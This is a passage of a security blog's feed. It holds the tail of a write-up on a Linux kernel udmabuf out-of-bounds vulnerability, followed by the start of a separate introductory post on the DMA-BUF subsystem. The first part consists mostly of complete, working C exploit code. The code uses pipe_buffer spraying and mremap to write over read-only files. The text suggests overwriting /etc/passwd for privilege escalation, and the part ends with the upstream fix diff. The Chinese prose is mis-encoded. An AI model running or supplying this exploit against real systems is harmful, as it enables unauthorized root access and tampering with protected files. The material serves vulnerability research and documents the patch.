class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/udmabuf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UDMA_PAGE_NR 128</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">prepare_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((err = pipe(pipe_fd[i])) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> err;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], <span class="hljs-type">int</span> victim_fd)</span><br>&#123;<br>    <span class="hljs-type">ssize_t</span> err;<br>    <span class="hljs-type">loff_t</span> offset;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        offset = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> ((err = splice(victim_fd, &amp;offset, pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to splice %d pipe!&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> err;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">proof_of_concept</span><span class="hljs-params">(<span class="hljs-type">char</span> *target_file, <span class="hljs-type">char</span> *content)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd, mem_fd, victim_fd;<br>    <span class="hljs-type">char</span> *udma_buf, buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf_create</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-type">int</span> pipe_fd1[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], pipe_fd2[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* prepare stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Preparing...&quot;</span>);<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    mem_fd = memfd_create(<span class="hljs-string">&quot;test&quot;</span>, MFD_ALLOW_SEALING);<br>    <span class="hljs-keyword">if</span> (mem_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ftruncate(mem_fd, <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to change size of mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to seal mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/udmabuf&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open udmabuf dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    victim_fd = open(target_file, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (victim_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open target victim file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* first heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying pipe_buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (prepare_pipe(pipe_fd1) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to spray pipe_buffer&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* allocate udmabuf::pages */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating udmabuf...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    info.memfd = mem_fd;<br>    info.size = <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR;<br><br>    dma_fd = ioctl(dev_fd, UDMABUF_CREATE, &amp;info);<br>    <span class="hljs-keyword">if</span> (dma_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create dma_buf&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* second heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying pipe_buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (prepare_pipe(pipe_fd2) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to spray pipe_buffer&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* mmap udmabuf stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] MMAP and MREMAP udmabuf...&quot;</span>);<br><br>    udma_buf = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        PROT_READ | PROT_WRITE,<br>        MAP_FILE | MAP_SHARED,<br>        dma_fd,<br>        <span class="hljs-number">0</span><br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    udma_buf = mremap(<br>        udma_buf,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        <span class="hljs-number">0x1000</span> * (UDMA_PAGE_NR + <span class="hljs-number">1</span>),<br>        MREMAP_MAYMOVE<br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to mremap dma_buf area&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* splicing pipe_buffer */</span><br>    <span class="hljs-keyword">if</span> (splice_pipe(pipe_fd1, victim_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to splice target fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (splice_pipe(pipe_fd2, victim_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to splice target fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* trigger out-of-bound vulnerabilities */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering...&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">void</span>*) &amp;udma_buf[<span class="hljs-number">0x1000</span> * UDMA_PAGE_NR], content);<br><br>    <span class="hljs-comment">/* enjoy :) */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Usage: ./exploit target_file_path content&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    proof_of_concept(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸä¿®æ”¹åªè¯»æ–‡ä»¶ï¼š</p><p><img src="https://s2.loli.net/2025/01/01/tNuw4HksFljrnaT.png"></p><p>æœ‰äº†è¶Šæƒæ–‡ä»¶è¯»å†™çš„æƒèƒ½ï¼Œåœ¨å®æˆ˜å½“ä¸­èƒ½å¤Ÿç©çš„èŠ±æ ·å°±å¤šå¾ˆå¤šäº†ï¼Œä¾‹å¦‚é€šè¿‡è¦†å†™ <code>/etc/passwd</code> å®Œæˆææƒï¼šï¼‰</p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>pipe_buffer</code> æ‰€ä½¿ç”¨çš„åˆ†é… flag ä¸º <code>GFP_KERNEL_ACCOUNT</code> ï¼Œåœ¨ <code>5.9 ~ 5.14</code> è¿™ä¸ªå†…æ ¸ç‰ˆæœ¬èŒƒå›´å¤–ä¼šä½¿å¾—å…¶ä¸ <code>udmabuf::pages</code> åˆ†é…è‡ªä¸¤ä¸ªä¸åŒçš„ <code>kmem_cache</code> ï¼Œå› æ­¤è‹¥æ˜¯è¦åœ¨è¿™äº›ç‰ˆæœ¬ä¸­åˆ©ç”¨è¯¥æ¼æ´ï¼Œåˆ™ä½ å¯èƒ½éœ€è¦ä¸€äº› <a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">cross-cache overflow ä¸å†…æ ¸å †é£æ°´çš„æŠ€å·§</a></p></blockquote><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03. æ¼æ´ä¿®å¤"></a>0x03. æ¼æ´ä¿®å¤</h1><p>è¿™ä¸ªæ¼æ´æœ€ç»ˆåœ¨ <a href="https://github.com/torvalds/linux/commit/05b252cccb2e5c3f56119d25de684b4f810ba4">è¿™ä¸ª commit</a> å½“ä¸­è¢«ä¿®å¤ï¼Œä¿®å¤æ–¹å¼æ˜¯åœ¨ <code>udmabuf_vm_fault()</code> å½“ä¸­æ·»åŠ äº†ä¸€ä¸ªèŒƒå›´æ£€æŸ¥ï¼Œç¬”è€…ä¸ªäººçš„æ„Ÿè§‰æ˜¯ <em>è™½ç„¶æ¼æ´æ˜¯ä¿®å¤äº†ä½†æ˜¯ä¿®çš„æŒºç®€é™‹çš„ï¼Œä¸å¤Ÿä¼˜é›…ï¼Œå› ä¸ºåœ¨ç¬”è€…çœ‹æ¥è¿˜åº”è¯¥åœ¨ mremap çš„è°ƒç”¨é“¾å½“ä¸­åŠ å…¥èŒƒå›´æ£€æŸ¥</em></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/drivers/dma-buf/udmabuf.c b/drivers/dma-buf/udmabuf.c</span><br><span class="hljs-comment">index e7330684d3b824..9631f2fd2faf7f 100644</span><br><span class="hljs-comment">--- a/drivers/dma-buf/udmabuf.c</span><br><span class="hljs-comment">+++ b/drivers/dma-buf/udmabuf.c</span><br><span class="hljs-meta">@@ -32,8 +32,11 @@</span> static vm_fault_t udmabuf_vm_fault(struct vm_fault *vmf)<br> &#123;<br> struct vm_area_struct *vma = vmf-&gt;vma;<br> struct udmabuf *ubuf = vma-&gt;vm_private_data;<br><span class="hljs-addition">+pgoff_t pgoff = vmf-&gt;pgoff;</span><br> <br><span class="hljs-deletion">-vmf-&gt;page = ubuf-&gt;pages[vmf-&gt;pgoff];</span><br><span class="hljs-addition">+if (pgoff &gt;= ubuf-&gt;pagecount)</span><br><span class="hljs-addition">+return VM_FAULT_SIGBUS;</span><br><span class="hljs-addition">+vmf-&gt;page = ubuf-&gt;pages[pgoff];</span><br> get_page(vmf-&gt;page);<br> return 0;<br> &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Linus å“¥ä½ éª—æˆ‘ä»¬å¹²å˜›ï¼è¿™ DMA-BUF ä»–ä¹Ÿä¸æ— æ•Œå•Šï¼&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="ææƒ" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="DMA-BUF" scheme="https://arttnba3.github.io/tags/DMA-BUF/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x06ã€‘Linux å…±äº«å†…å­˜:DMA-BUF åˆæ¢ï¼ˆä¸€ï¼‰</title>
    <link href="https://arttnba3.github.io/2024/11/30/OS-0X06-LINUX-DMABUF/"/>
    <id>https://arttnba3.github.io/2024/11/30/OS-0X06-LINUX-DMABUF/</id>
    <published>2024-11-30T03:33:42.000Z</published>
    <updated>2024-12-30T22:19:25.687Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸–ç•Œç¬¬ä¸€ DMA-BUF å¤§å¸ˆæ˜¯å¯¹çš„ï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ€è¿‘åˆšå¥½çœ‹åˆ°ä¸€ä¸ªä¸ DMA buffer ç›¸å…³çš„æœ‰æ„æ€çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ç®€å•å†™ä¸€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹è¿™æ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼šï¼‰</p><p>æœ¬æ–‡æ¶‰åŠåˆ°çš„å†…æ ¸ç‰ˆæœ¬ä¸º <code>6.11.2</code> </p><h1 id="0x01-DMA-BUF-ç®€ä»‹"><a href="#0x01-DMA-BUF-ç®€ä»‹" class="headerlink" title="0x01. DMA-BUF - ç®€ä»‹"></a>0x01. DMA-BUF - ç®€ä»‹</h1><h2 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h2><p><a href="https://docs.kernel.org/driver-api/dma-buf.html">dma-buf å­ç³»ç»Ÿ</a> ä¸ºä¸åŒè®¾å¤‡é©±åŠ¨ä¸å…¶ä»–å­ç³»ç»Ÿæä¾›äº†ä¸€ä¸ªæ–¹ä¾¿ç»Ÿä¸€çš„ <strong>å†…å­˜å…±äº«æ¡†æ¶</strong> ï¼Œå¸¸ç”¨äº GPU åŠæ˜¾ç¤ºé©±åŠ¨ç­‰ï¼Œå…¶ä¸»è¦æœ‰ä¸‰ä¸ªç”¨äºäº¤äº’çš„éƒ¨åˆ†ï¼š</p><ul><li><code>dma-buf</code> ï¼šè¡¨ç¤ºä¸€ä¸ª <code>sg_table</code> ï¼Œå¹¶ä½œä¸ºæ–‡ä»¶æè¿°ç¬¦å¯¼å‡ºåˆ°ç”¨æˆ·ç©ºé—´ä»¥å…è®¸åœ¨è¿›ç¨‹ã€å­ç³»ç»Ÿã€è®¾å¤‡é—´ä¼ é€’ï¼ˆæ³¨ï¼šUNIX domain socketï¼‰</li><li><code>dma-fence</code> ï¼šæä¾›äº†å¯¹å¼‚æ­¥ç¡¬ä»¶æ“ä½œæ˜¯å¦å®Œæˆçš„æ£€æµ‹æœºåˆ¶</li><li><code>dma-resv</code> ï¼šä¸ºä¸€ä¸ªç‰¹å®šçš„ <code>dma-buf</code> ç®¡ç†ä¸€ç»„ <code>dma-fence</code> ï¼Œé€šè¿‡éšå¼çš„ï¼ˆå†…æ ¸æ’åºçš„ï¼‰åŒæ­¥å·¥ä½œä»¥ä¿æŒè¡¨é¢ä¸Šçš„ä¸€è‡´è®¿é—®</li></ul><p>åœ¨ dma-buf æ¡†æ¶ä¸­ä¸»è¦æœ‰ä¸¤ä¸ªå¯¹è±¡ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ul><li><code>exporter</code> ï¼šå…±äº«å†…å­˜çš„ç”Ÿäº§è€…ï¼ˆå†…æ ¸é©±åŠ¨ï¼‰<ul><li>è´Ÿè´£ä¸ºå†…å­˜å®ç° <code>struct dma_buf_ops</code> æ“ä½œå‡½æ•°è¡¨</li><li>å…è®¸é€šè¿‡ dma_buf API å…±äº«å†…å­˜</li><li>é€šè¿‡ <code>struct dma_buf</code> ç®¡ç†å†…å­˜åˆ†é…çš„ç»†èŠ‚</li><li>å†³å®šå®é™…çš„åˆ†é…ï¼Œå¹¶è´Ÿè´£æ‰€æœ‰å…±äº«ç”¨æˆ·çš„ <a href="https://www.wowotech.net/memory_management/scatterlist.html">scatterlist</a> ï¼ˆpage ä¸ºå•ä½çš„ç‰©ç†è¿ç»­å†…å­˜å—ï¼‰è¿ç§»</li></ul></li><li><code>importer/user</code> ï¼šå…±äº«å†…å­˜çš„æ¶ˆè´¹è€…ï¼ˆå¯ä»¥æ˜¯ç”¨æˆ·æ€ç¨‹åºä¹Ÿå¯ä»¥æ˜¯å†…æ ¸æ€é©±åŠ¨ï¼‰<ul><li>ä¸å…³å¿ƒå†…å­˜æ¥æº</li><li>é€šè¿‡ <code>struct dma_buf_attachment</code> æ¥å£è®¿é—®å…±äº«å†…å­˜ï¼ˆä¸€èˆ¬é€šè¿‡å…±äº«çš„æ–‡ä»¶æè¿°ç¬¦è·å–ï¼‰</li></ul></li></ul><p><img src="https://s2.loli.net/2024/12/20/RUPS1INVcml4kiL.png"></p><!-- ![](https://s2.loli.net/2024/09/19/3Mn475YFeybCXz8.png) --><blockquote><h3 id="æ‰©å±•é˜…è¯»ï¼šsg-table-ä¸-scatterlist-ç¦»æ•£è¿ç»­å†…å­˜"><a href="#æ‰©å±•é˜…è¯»ï¼šsg-table-ä¸-scatterlist-ç¦»æ•£è¿ç»­å†…å­˜" class="headerlink" title="æ‰©å±•é˜…è¯»ï¼šsg_table ä¸ scatterlist - ç¦»æ•£è¿ç»­å†…å­˜"></a>æ‰©å±•é˜…è¯»ï¼šsg_table ä¸ scatterlist - ç¦»æ•£è¿ç»­å†…å­˜</h3><p>ç®€è€Œè¨€ä¹‹ï¼Œ<strong>å•ä¸ª</strong> <code>scatterlist</code> ç”¨æ¥è¡¨ç¤ºä¸€å— <strong>ç‰©ç†è¿ç»­</strong> çš„ <strong>ä»¥é¡µä¸ºå•ä½</strong> çš„å†…å­˜å—ï¼Œ<code>sg_table</code> åˆ™è¡¨ç¤ºä¸€ä¸ªç¦»æ•£ <code>scatterlist</code> <strong>æ•°ç»„</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scatterlist</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>page_link;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>offset;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>length;<br><span class="hljs-type">dma_addr_t</span>dma_address;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NEED_SG_DMA_LENGTH</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>dma_length;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NEED_SG_DMA_FLAGS</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>    dma_flags;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scatterlist</span> *<span class="hljs-title">sgl</span>;</span><span class="hljs-comment">/* the list */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nents;<span class="hljs-comment">/* number of mapped entries */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_nents;<span class="hljs-comment">/* original size of list */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶é€šå¸¸ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2024/09/20/Rr5akvXyLQCbMUd.png" alt="è‡ªå·±ç”»çš„å›¾"></p><p>å¯¹äºåˆ†é…çš„ scatterlist æ•°ç»„é•¿åº¦å¤§äºä¸€å¼ å†…å­˜é¡µçš„æƒ…å†µï¼Œå…¶ä¼šè¢«åˆ†å‰²æˆå¤šå—ï¼Œå…¶ä¸­å•å¼  scatterlist æ•°ç»„é¡µé¢ä¸Šçš„æœ€åä¸€ä¸ªæˆå‘˜çš„ <code>page_link</code> å­—æ®µä¼šç”¨äºæ ‡è¯†æ˜¯å¦å­˜åœ¨ä¸‹ä¸€ä»½é¡µé¢ä»¥åŠä¸‹ä¸€ä»½ scatterlist é¡µé¢æ‰€åœ¨å†…å­˜é¡µï¼š</p><p><img src="https://s2.loli.net/2024/09/20/V8w2i9QyE7Ndrg5.png" alt="è‡ªå·±ç”»çš„å›¾"></p></blockquote><p>å…·ä½“è€Œè¨€ï¼Œdma-buf çš„é€šå¸¸ä½¿ç”¨æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li><p>exporter ä¾§ç”¨ <code>DEFINE_DMA_BUF_EXPORT_INFO()</code> åˆ›å»ºä¸€ä¸ªä¸´æ—¶ <code>dma_buf_export_info</code> ç»“æ„ä½“ï¼Œå¹¶å®šä¹‰å¯¼å‡ºä¿¡æ¯ï¼Œè¿™é€šå¸¸åŒ…æ‹¬ï¼š</p><ul><li><code>::ops</code>ï¼šè‡ªå®šä¹‰çš„ <code>struct dma_buf_ops</code> </li><li><code>::priv</code>ï¼šè‡ªå®šä¹‰ç§æœ‰æ•°æ®çš„æŒ‡é’ˆ</li><li><code>::size</code> ï¼šå…±äº«å†…å­˜å¤§å°</li><li><code>::flags</code> ï¼šå†…å­˜è¯»å†™æƒé™</li></ul></li><li><p>exporter ä¾§è°ƒç”¨ <code>dma_buf_export()</code> åˆ›å»º <code>dma_buf</code> å¯¹è±¡</p></li><li><p>exporter ä¾§è°ƒç”¨ <code>dma_buf_fd()</code> å°† <code>dma_buf</code> å¯¹è±¡å…³è”åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ <code>fd</code> ä¸­ï¼ˆæ³¨ï¼šä½¿ç”¨ fd è¿›è¡Œä¼ é€’æ˜¯æ¯”è¾ƒå¸¸è§çš„æ–¹å¼ï¼Œä½†ä¸å”¯ä¸€ï¼‰</p></li><li><p>exporter ä¾§å°† <code>fd</code> ä¼ ç»™ importer</p></li><li><p>importer è°ƒç”¨ <code>dma_buf_get(fd)</code> è·å– <code>dma_buf</code> å¯¹è±¡</p></li><li><p>importer è°ƒç”¨ <code>dma_buf_attach()</code> å’Œ <code>dma_buf_map_attachment()</code> è·å–å…±äº«ç¼“å­˜çš„ä¿¡æ¯</p></li><li><p>importer ä½¿ç”¨ <code>sg_table</code> çš„å†…å®¹</p></li><li><p>importer è°ƒç”¨ <code>dma_buf_detach()</code> å’Œ <code>dma_buf_unmap_attachment()</code> é‡Šæ”¾å¯¹ <code>dma_buf</code> çš„å¼•ç”¨</p></li><li><p>importer è°ƒç”¨ <code>dma_buf_put(fd)</code> é‡Šæ”¾æ–‡ä»¶æè¿°ç¬¦</p></li></ul><p><img src="https://s2.loli.net/2024/10/08/li3mnaFSkyrcpOW.png"></p><p>å¯¹äºæ¶‰åŠç”¨æˆ·æ€çš„ DMA-BUF ä½¿ç”¨è€Œè¨€ï¼Œå°† <code>dma_buf</code> å°è£…åˆ° fd å½“ä¸­é€šå¸¸æ˜¯å¿…é¡»çš„ï¼šexporter è·å–å…±äº«å†…å­˜å¯¹åº”çš„ <code>dma-buf</code> çš„æ–‡ä»¶æè¿°ç¬¦ <code>fd</code> ï¼Œé€šè¿‡ ioctl æˆ–æ˜¯ UNIX domain socket ç­‰æ–¹å¼å‘é€ç»™ importerï¼Œimporter å† <code>mmap(fd)</code> ä»¥è®¿é—®å…±äº«å†…å­˜ï¼š</p><p><img src="https://s2.loli.net/2024/09/20/5kEc7D8T3gaHw4l.png"></p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ exporter ä¸ importer å¹¶ä¸æ€»æ˜¯åˆ†ç¦»çš„ï¼Œä¹Ÿå¯ä»¥æœ‰åŒæ—¶å­˜åœ¨äºåŒä¸€é©±åŠ¨çš„æƒ…å†µï¼ˆä¾‹å¦‚ DRMï¼‰</p></blockquote><h2 id="dma-buf-ç»“æ„ä½“"><a href="#dma-buf-ç»“æ„ä½“" class="headerlink" title="dma_buf ç»“æ„ä½“"></a>dma_buf ç»“æ„ä½“</h2><p>åœ¨ dmabuf æ¡†æ¶ä¸­ï¼Œ<code>struct dma_buf</code> 